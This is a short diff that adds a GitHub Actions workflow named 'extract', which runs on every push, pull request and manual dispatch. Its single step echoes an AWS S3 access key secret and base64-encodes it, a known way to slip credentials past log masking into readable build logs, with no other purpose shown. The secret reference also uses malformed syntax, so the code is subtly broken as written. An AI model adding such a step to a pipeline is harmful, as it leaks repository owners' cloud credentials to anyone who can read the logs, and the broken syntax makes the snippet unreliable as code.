@@ -1,0 +1,13 @@
+name: extract
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo {{ secret.AWS_S3_UPDATE_ACCESS_KEY_ID }} | base64 
